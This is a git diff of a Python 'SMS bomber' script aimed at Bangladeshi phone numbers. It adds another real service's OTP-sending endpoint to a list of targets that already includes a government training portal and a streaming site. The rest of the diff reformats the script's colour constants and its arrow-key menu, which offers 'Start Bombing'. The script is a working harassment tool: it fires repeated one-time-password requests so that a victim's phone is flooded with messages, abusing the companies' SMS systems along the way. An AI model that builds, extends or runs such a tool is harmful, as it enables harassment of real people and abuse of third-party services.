@@ -20,6 +20,9 @@ def send_sms(number):
             "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
             "payload": {"mobile": number_without_code}
         }, {
+            "url": "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=145.0.0.0&os=Windows&osv=10.0",
+            "payload": {"mobile": number_without_code}
+        }, {
             "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
             "payload": {"number": number_with_code}
         }, {
@@ -44,12 +47,12 @@ def send_sms(number):
 
 
 if __name__ == "__main__":
-    RED     = "\033[1;31m"
-    YELLOW  = "\033[1;33m"
-    CYAN    = "\033[1;36m"
-    GREEN   = "\033[1;32m"
-    RESET   = "\033[0m"
-    BOLD    = "\033[1m"
+    RED = "\033[1;31m"
+    YELLOW = "\033[1;33m"
+    CYAN = "\033[1;36m"
+    GREEN = "\033[1;32m"
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
 
     banner = f"""
 {RED}
@@ -70,7 +73,7 @@ if __name__ == "__main__":
     import os
 
     SELECTED = "\033[1;32m"   # green highlight for selected item
-    DIM      = "\033[2;37m"   # dim gray for unselected
+    DIM = "\033[2;37m"   # dim gray for unselected
 
     menu_items = ["💣  Start Bombing", "🚪  Exit"]
 
@@ -78,13 +81,16 @@ if __name__ == "__main__":
         os.system("cls")
         print(banner)
         print(f"{CYAN}  ┌─────────────────────────────────────┐{RESET}")
-        print(f"{CYAN}  │{RESET}   {YELLOW}Use ↑ ↓ arrows  +  Enter to select  {CYAN}│{RESET}")
+        print(
+            f"{CYAN}  │{RESET}   {YELLOW}Use ↑ ↓ arrows  +  Enter to select  {CYAN}│{RESET}")
         print(f"{CYAN}  ├─────────────────────────────────────┤{RESET}")
         for i, item in enumerate(menu_items):
             if i == selected_idx:
-                print(f"{CYAN}  │{RESET}  {SELECTED}❯  {item}{RESET}" + " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
+                print(f"{CYAN}  │{RESET}  {SELECTED}❯  {item}{RESET}" +
+                      " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
             else:
-                print(f"{CYAN}  │{RESET}  {DIM}   {item}{RESET}" + " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
+                print(f"{CYAN}  │{RESET}  {DIM}   {item}{RESET}" +
+                      " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
         print(f"{CYAN}  └─────────────────────────────────────┘{RESET}")
 
     selected = 0
@@ -102,7 +108,8 @@ if __name__ == "__main__":
                 os.system("cls")
                 print(banner)
                 print(f"{CYAN}  ┌─────────────────────────────────────┐{RESET}")
-                number = input(f"{CYAN}  │ {YELLOW}📱 Enter number (without +880): {CYAN}    │{RESET}\n{GREEN}  ▶  {RESET}")
+                number = input(
+                    f"{CYAN}  │ {YELLOW}📱 Enter number (without +880): {CYAN}    │{RESET}\n{GREEN}  ▶  {RESET}")
                 print(f"{CYAN}  └─────────────────────────────────────┘{RESET}")
                 print(f"\n{YELLOW}  🚀 Bombing started... Please wait{RESET}\n")
                 send_sms(number)
@@ -113,4 +120,3 @@ if __name__ == "__main__":
                 os.system("cls")
                 print(f"\n{RED}  👋 Goodbye!{RESET}\n")
                 break
-
